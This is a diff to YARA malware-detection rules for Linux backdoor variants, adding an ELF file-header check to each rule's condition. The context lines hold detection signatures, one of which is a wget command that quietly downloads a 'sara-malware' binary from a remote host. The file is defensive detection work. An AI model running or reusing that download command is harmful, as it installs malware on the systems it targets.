@@ -18,6 +18,7 @@ rule Backdoor_Linux_SAgnt_A_2147826935_0
         $x_1_3 = {31 c0 4c 89 ef 48 83 c9 ff f2 ae f7 d9 48 63 d9 48 89 df e8 82 ff ff ff 4c 89 e9 48 89 04 24 48 89 c7 ba 6a 8e 43 00 48 89 de 31 c0}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -42,6 +43,7 @@ rule Backdoor_Linux_SAgnt_B_2147826936_0
         $x_1_4 = "Host: 127.0.0.1:52869" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -66,6 +68,7 @@ rule Backdoor_Linux_SAgnt_C_2147828992_0
         $x_1_4 = "/usr/bin/wget -q -b http://downloadsite.com/sara-malware /usr/bin/sara-malware" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -89,6 +92,7 @@ rule Backdoor_Linux_SAgnt_B_2147845204_0
         $x_1_3 = "pel_recv_msg" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -114,6 +118,7 @@ rule Backdoor_Linux_SAgnt_C_2147893466_0
         $x_1_5 = "Welcome to my backdoor access" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -135,6 +140,7 @@ rule Backdoor_Linux_SAgnt_L_2147919802_0
         $x_1_1 = {83 90 12 00 28 00 b3 af 20 00 b1 af 1c 00 b0 af 2c 00 bf af 10 00 bc af 21 88 40 00 ff ff 52 26 21 98 60 00 42 00 10 3c}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
